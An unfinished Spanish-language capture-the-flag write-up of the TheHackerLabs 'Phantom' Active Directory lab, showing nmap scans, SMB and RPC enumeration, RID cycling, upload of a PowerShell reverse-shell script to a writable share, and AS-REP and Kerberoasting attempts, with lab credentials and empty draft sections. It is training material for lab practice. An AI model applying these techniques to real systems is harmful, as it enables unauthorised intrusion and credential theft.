---
layout: single
title: Phantom - TheHackerLabs
excerpt: "."
date: 2026-04-28
classes: wide
header:
  teaser: /assets/images/THL-writeup-phantom/phantom.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Medium Machine
tags:
  - Windows
  - Active Directory
  - SMB
  - RPC
  - Kerberos
  - WinRM
  - SMB Enumeration
  - RYD Cycling Attack
  - RPC Enumeration
  - OSCP Style
---
![](/assets/images/THL-writeup-phantom/phantom.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Hosts">Descubrimiento de Hosts</a></li>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#SMB">Enumeración de Servicio SMB</a></li>
				<ul>
					<li><a href="#RYD">Aplicando RYD Cycling Attack</a></li>
				</ul>
				<li><a href="#RPC">Enumeración de Servicio RPC</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Hosts">Descubrimiento de Hosts</h2>

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.56.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 23:07 -0600
Nmap scan report for 192.168.56.1
Host is up (0.00042s latency).
MAC Address: XX (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00053s latency).
MAC Address: XX (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.91 seconds
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.56.0/24
Interface: eth0, type: EN10MB, MAC: 08:00:27:8d:c1:60, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1	XX	PCS Systemtechnik GmbH
192.168.56.100	XX	PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.143 seconds (119.46 hosts/sec). 2 responded
```

Encontramos nuestro objetivo y es: `192.168.56.100`.

<br>

<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.56.100
PING 192.168.56.100 (192.168.56.100) 56(84) bytes of data.
64 bytes from 192.168.56.100: icmp_seq=1 ttl=128 time=0.804 ms
64 bytes from 192.168.56.100: icmp_seq=2 ttl=128 time=1.00 ms
64 bytes from 192.168.56.100: icmp_seq=3 ttl=128 time=0.971 ms
64 bytes from 192.168.56.100: icmp_seq=4 ttl=128 time=0.874 ms

--- 192.168.56.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 0.804/0.912/1.001/0.078 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.56.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 23:09 -0600
Initiating ARP Ping Scan at 23:09
Scanning 192.168.56.100 [1 port]
Completed ARP Ping Scan at 23:09, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:09
Scanning 192.168.56.100 [65535 ports]
Discovered open port 135/tcp on 192.168.56.100
Discovered open port 139/tcp on 192.168.56.100
Discovered open port 53/tcp on 192.168.56.100
Discovered open port 445/tcp on 192.168.56.100
Discovered open port 3269/tcp on 192.168.56.100
Discovered open port 59503/tcp on 192.168.56.100
Discovered open port 59466/tcp on 192.168.56.100
Discovered open port 593/tcp on 192.168.56.100
Discovered open port 59458/tcp on 192.168.56.100
Discovered open port 88/tcp on 192.168.56.100
Discovered open port 9389/tcp on 192.168.56.100
Discovered open port 464/tcp on 192.168.56.100
Discovered open port 636/tcp on 192.168.56.100
Discovered open port 3268/tcp on 192.168.56.100
Discovered open port 59464/tcp on 192.168.56.100
Discovered open port 59487/tcp on 192.168.56.100
Discovered open port 5985/tcp on 192.168.56.100
Discovered open port 49664/tcp on 192.168.56.100
Discovered open port 59478/tcp on 192.168.56.100
Discovered open port 389/tcp on 192.168.56.100
Completed SYN Stealth Scan at 23:09, 26.32s elapsed (65535 total ports)
Nmap scan report for 192.168.56.100
Host is up, received arp-response (0.00060s latency).
Scanned at 2026-04-26 23:09:21 CST for 26s
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
5985/tcp  open  wsman            syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49664/tcp open  unknown          syn-ack ttl 128
59458/tcp open  unknown          syn-ack ttl 128
59464/tcp open  unknown          syn-ack ttl 128
59466/tcp open  unknown          syn-ack ttl 128
59478/tcp open  unknown          syn-ack ttl 128
59487/tcp open  unknown          syn-ack ttl 128
59503/tcp open  unknown          syn-ack ttl 128
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.50 seconds
           Raw packets sent: 131053 (5.766MB) | Rcvd: 23 (996B)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

<br>

Vemos muchos puertos abiertos, entre ellos el **puerto 88**, que nos indica el uso del **servicio Kerberos**, por lo que nos enfrentaremos a una máquina **Active Directory**.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,59458,59464,59466,59478,59487,59503 192.168.56.100 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 23:10 -0600
Nmap scan report for 192.168.56.100
Host is up (0.0016s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-27 05:25:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-27T05:26:59+00:00; +15m15s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
59458/tcp open  msrpc         Microsoft Windows RPC
59464/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59466/tcp open  msrpc         Microsoft Windows RPC
59478/tcp open  msrpc         Microsoft Windows RPC
59487/tcp open  msrpc         Microsoft Windows RPC
59503/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 15m15s, deviation: 0s, median: 15m14s
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: XX (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2026-04-27T05:26:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.34 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

<br>

Gracias a este escaneo, podemos ver muchas cosas interesantes:
* Podemos ver cual es el dominio del **AD** siendo `PHANTOM.THL` y `DC01.PHANTOM.THL`, siendo que podemos guardarlos en el `/etc/hosts`:
```bash
echo "192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL" >> /etc/hosts
```
* Vemos que el **puerto 5985** esta abierto, lo que nos dice que quizá nos podamos conectar a la máquina víctima vía **WinRM**.
* El **servicio SMB** nos dice que se necesita un usuario y contraseña para poder utilizarlo.

Para avanzar con esta máquina, tenemos un usuario y contraseña que nos puede ayudar a encontrar alguna vulnerabilidad:
```bash
User: mark
Pass: suP3rPa$sw0rd2026!&
```
Vamos a comenzar con enumeración del **servicio SMB**, luego del **servicio RPC** y por último veamos que podemos realizar antes el **servicio Kerberos**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="SMB">Enumeración de Servicio SMB</h2>

Utilicemos la herramienta **netexec** para ver información del **servicio SMB**:
```bash
nxc smb 192.168.56.100
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
```

Ahora, probemos si las credenciales que nos dieron funcionan:
```bash
nxc smb 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&'
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!&
```
Si funcionan.

Veamos qué archivos compartidos existen con la herramienta **smbmap**:
```bash
smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.56.100:445	Name: 192.168.56.100      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dev Tools                                         	READ, WRITE	Dev Tools
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
[*] Closed 1 connections
```
Existe un directorio en el que podemos leer y escribir.

Veamos su contenido:
```bash
smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' -r 'Dev Tools' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.56.100:445	Name: 192.168.56.100      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dev Tools                                         	READ, WRITE	Dev Tools
	./Dev Tools
	dr--r--r--                0 Sun Apr 26 23:30:33 2026	.
	dr--r--r--                0 Sat Feb 21 11:29:29 2026	..
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
[*] Closed 1 connections
```
Curiosamente, no hay nada.

Lo que podríamos hacer es obtener todos los usuarios existentes de la máquina, aplicando un **RYD Cycling Attack**.

<br>

<h3 id="RYD">Aplicando RYD Cycling Attack</h3>

Esto lo aplicaremos con la herramienta **netexec** y la flag `--rid-brute`:
```bash
nxc smb 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --rid-brute
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!& 
SMB         192.168.56.100  445    DC01             498: PHANTOM\Enterprise Domain Controllers de sólo lectura (SidTypeGroup)
SMB         192.168.56.100  445    DC01             500: PHANTOM\Administrador (SidTypeUser)
SMB         192.168.56.100  445    DC01             501: PHANTOM\Invitado (SidTypeUser)
SMB         192.168.56.100  445    DC01             502: PHANTOM\krbtgt (SidTypeUser)
SMB         192.168.56.100  445    DC01             512: PHANTOM\Admins. del dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             513: PHANTOM\Usuarios del dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             514: PHANTOM\Invitados del dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             515: PHANTOM\Equipos del dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             516: PHANTOM\Controladores de dominio (SidTypeGroup)
SMB         192.168.56.100  445    DC01             517: PHANTOM\Publicadores de certificados (SidTypeAlias)
SMB         192.168.56.100  445    DC01             518: PHANTOM\Administradores de esquema (SidTypeGroup)
SMB         192.168.56.100  445    DC01             519: PHANTOM\Administradores de empresas (SidTypeGroup)
SMB         192.168.56.100  445    DC01             520: PHANTOM\Propietarios del creador de directivas de grupo (SidTypeGroup)
SMB         192.168.56.100  445    DC01             521: PHANTOM\Controladores de dominio de sólo lectura (SidTypeGroup)
SMB         192.168.56.100  445    DC01             522: PHANTOM\Controladores de dominio clonables (SidTypeGroup)
SMB         192.168.56.100  445    DC01             525: PHANTOM\Protected Users (SidTypeGroup)
SMB         192.168.56.100  445    DC01             526: PHANTOM\Administradores clave (SidTypeGroup)
SMB         192.168.56.100  445    DC01             527: PHANTOM\Administradores clave de la organización (SidTypeGroup)
SMB         192.168.56.100  445    DC01             553: PHANTOM\Servidores RAS e IAS (SidTypeAlias)
SMB         192.168.56.100  445    DC01             571: PHANTOM\Grupo de replicación de contraseña RODC permitida (SidTypeAlias)
SMB         192.168.56.100  445    DC01             572: PHANTOM\Grupo de replicación de contraseña RODC denegada (SidTypeAlias)
SMB         192.168.56.100  445    DC01             1000: PHANTOM\DC01$ (SidTypeUser)
SMB         192.168.56.100  445    DC01             1101: PHANTOM\DnsAdmins (SidTypeAlias)
SMB         192.168.56.100  445    DC01             1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1103: PHANTOM\mark (SidTypeUser)
SMB         192.168.56.100  445    DC01             1104: PHANTOM\bob (SidTypeUser)
SMB         192.168.56.100  445    DC01             1105: PHANTOM\joe (SidTypeUser)
SMB         192.168.56.100  445    DC01             1106: PHANTOM\mia (SidTypeUser)
SMB         192.168.56.100  445    DC01             1107: PHANTOM\sandra (SidTypeUser)
SMB         192.168.56.100  445    DC01             1108: PHANTOM\maria (SidTypeUser)
SMB         192.168.56.100  445    DC01             1109: PHANTOM\ana (SidTypeUser)
SMB         192.168.56.100  445    DC01             1110: PHANTOM\michael (SidTypeUser)
SMB         192.168.56.100  445    DC01             1111: PHANTOM\ian (SidTypeUser)
SMB         192.168.56.100  445    DC01             1112: PHANTOM\joshua (SidTypeUser)
SMB         192.168.56.100  445    DC01             1113: PHANTOM\frank (SidTypeUser)
SMB         192.168.56.100  445    DC01             1115: PHANTOM\tomas (SidTypeUser)
SMB         192.168.56.100  445    DC01             1116: PHANTOM\robert (SidTypeUser)
SMB         192.168.56.100  445    DC01             1117: PHANTOM\IT (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1118: PHANTOM\Support (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1119: PHANTOM\RRHH (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1120: PHANTOM\Finances (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1121: PHANTOM\Developers (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1122: PHANTOM\HelpDesk (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1123: PHANTOM\DevOps (SidTypeGroup)
SMB         192.168.56.100  445    DC01             1124: PHANTOM\LegacyAdmins (SidTypeUser)
SMB         192.168.56.100  445    DC01             1125: PHANTOM\Monitoring (SidTypeGroup)
```
Observa todos los grupos que obtenemos y los usuarios.

Con estos usuarios podemos intentar aplicar un **Password Spraying** para saber si alguno de estos tiene la misma contraseña que nuestro usuario actual, pero esto no servira.

Otra opción que tenemos es subir un archivo al directorio **Dev Tools**, suponiendo que todos los archivos que se suban se ejecuten, pero tampoco servira.

Por ahora, dejemos un poco **SMB** y apliquemos enumeración al **servicio RPC**.

<br>

<h2 id="RPC">Enumeración del Servicio RPC</h2>

Entremos al **servicio RPC** utilizando la herramienta **rpcclient**:
```bash
rpcclient -U 'mark%suP3rPa$sw0rd2026!&' 192.168.56.100
rpcclient $>
```
Estamos dentro.

Veamos los usuarios existentes:
```bash
rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[mark] rid:[0x44f]
user:[bob] rid:[0x450]
user:[joe] rid:[0x451]
user:[mia] rid:[0x452]
user:[sandra] rid:[0x453]
user:[maria] rid:[0x454]
user:[ana] rid:[0x455]
user:[michael] rid:[0x456]
user:[ian] rid:[0x457]
user:[joshua] rid:[0x458]
user:[frank] rid:[0x459]
user:[tomas] rid:[0x45b]
user:[robert] rid:[0x45c]
user:[LegacyAdmins] rid:[0x464]
```
Bien, no cambia a cuando lo hicimos con el **servicio SMB**.

Enumeremos las descripciones de cada usuario con `querydispinfo`, esto para ver si aparece algún dato de cualquier usuario que nos sea de ayuda:
```bash
rpcclient $> querydispinfo
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrador	Name: (null)	Desc: Cuenta integrada para la administración del equipo o dominio
index: 0xfb7 RID: 0x455 acb: 0x00000210 Account: ana	Name: Ana	Desc: (null)
index: 0xfb2 RID: 0x450 acb: 0x00000210 Account: bob	Name: Bob	Desc: (null)
index: 0xfbb RID: 0x459 acb: 0x00000210 Account: frank	Name: Frank	Desc: (null)
index: 0xfb9 RID: 0x457 acb: 0x00000210 Account: ian	Name: Ian	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Invitado	Name: (null)	Desc: Cuenta integrada para el acceso como invitado al equipo o dominio
index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: joe	Name: Joe	Desc: (null)
index: 0xfba RID: 0x458 acb: 0x00000210 Account: joshua	Name: Joshua	Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Cuenta de servicio de centro de distribución de claves
index: 0xfc6 RID: 0x464 acb: 0x00000210 Account: LegacyAdmins	Name: LegacyAdmins	Desc: Legacy administrative group maintained for backward compatibility with older systems.
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: maria	Name: Maria	Desc: (null)
index: 0xfb1 RID: 0x44f acb: 0x00000210 Account: mark	Name: Mark	Desc: (null)
index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: mia	Name: Mia	Desc: (null)
index: 0xfb8 RID: 0x456 acb: 0x00000210 Account: michael	Name: Michael	Desc: (null)
index: 0xfbe RID: 0x45c acb: 0x00000210 Account: robert	Name: Robert	Desc: (null)
index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: sandra	Name: Sandra	Desc: (null)
index: 0xfbd RID: 0x45b acb: 0x00000210 Account: tomas	Name: Tomas	Desc: (null)
```
No hay nada que destacar.

Enumeremos los grupos existentes:
```bash
rpcclient $> enumdomgroups
group:[Enterprise Domain Controllers de sólo lectura] rid:[0x1f2]
group:[Admins. del dominio] rid:[0x200]
group:[Usuarios del dominio] rid:[0x201]
group:[Invitados del dominio] rid:[0x202]
group:[Equipos del dominio] rid:[0x203]
group:[Controladores de dominio] rid:[0x204]
group:[Administradores de esquema] rid:[0x206]
group:[Administradores de empresas] rid:[0x207]
group:[Propietarios del creador de directivas de grupo] rid:[0x208]
group:[Controladores de dominio de sólo lectura] rid:[0x209]
group:[Controladores de dominio clonables] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Administradores clave] rid:[0x20e]
group:[Administradores clave de la organización] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[IT] rid:[0x45d]
group:[Support] rid:[0x45e]
group:[RRHH] rid:[0x45f]
group:[Finances] rid:[0x460]
group:[Developers] rid:[0x461]
group:[HelpDesk] rid:[0x462]
group:[DevOps] rid:[0x463]
group:[Monitoring] rid:[0x465]
```
Hay algunos grupos que se ven interesantes, por ejemplo, los grupos **IT, Developers, DevOps, Monitoring y Support**, así que quizá esto nos ayuda después.

Por último, te muestro el siguiente oneliner que nos ayuda a obtener todos los usuarios existentes con **rpcclient**:
```bash
rpcclient -U 'mark%suP3rPa$sw0rd2026!&' 192.168.56.100 -c "enumdomusers" | awk -F '[][]' '{print $2}'
Administrador
Invitado
krbtgt
mark
bob
joe
mia
sandra
maria
ana
michael
ian
joshua
frank
tomas
robert
LegacyAdmins
```
Ya solo guardalos en un archivo o solo agrega que la salida se guarde en un archivo.



ATAQUES POR PROBAR:
SCF attack -> carga el file.scf y activa responder
Fuerza bruta por kerberos o smb en base a roles de usuarios
Usar bloodhound-python y analizar con bloodhound
ENumerar denuevo RPC y ver cada descripcion de usuario, roles y grupos a los que pertenecen.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id=""></h2>

```bash
❯ smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' --upload Invoke-PowerShellTcp.ps1 'Dev Tools/Invoke-PowerShellTcp.ps1' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
[+] Starting upload: Invoke-PowerShellTcp.ps1 (4405 bytes)
[+] Upload complete..                                                                                                    
[*] Closed 1 connections                                                                                                     
                                                                                                                                                                                              
❯ smbmap -H 192.168.56.100 -u 'mark' -p 'suP3rPa$sw0rd2026!&' -r 'Dev Tools' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.56.100:445	Name: PHANTOM.THL         	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Admin remota
	C$                                                	NO ACCESS	Recurso predeterminado
	Dev Tools                                         	READ, WRITE	Dev Tools
	./Dev Tools
	dr--r--r--                0 Mon Apr 27 00:23:14 2026	.
	dr--r--r--                0 Sat Feb 21 11:29:29 2026	..
	fr--r--r--             4405 Sun Apr 26 23:49:21 2026	Invoke-PowerShellTcp.ps1
	IPC$                                              	READ ONLY	IPC remota
	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
	SYSVOL                                            	READ ONLY	Recurso compartido del servidor de inicio de sesi¢n 
[*] Closed 1 connections
```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash
❯ impacket-GetNPUsers -no-pass -usersfile usuarios.txt PHANTOM.THL/
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrador doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bob doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User joe doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mia doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sandra doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User maria doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ana doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User michael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ian doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User joshua doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User frank doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tomas doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robert doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User LegacyAdmins doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                                                                                              
❯ impacket-GetUserSPNs 'PHANTOM.THL/mark:suP3rPa$sw0rd2026!&' -dc-host DC01.PHANTOM.THL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!

```



<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>


<p align="center">
<img src="/assets/images/THL-writeup-phantom/Captura1.png">
</p>



```bash

```

```bash

```

```bash

```

```bash

```



<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>

# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
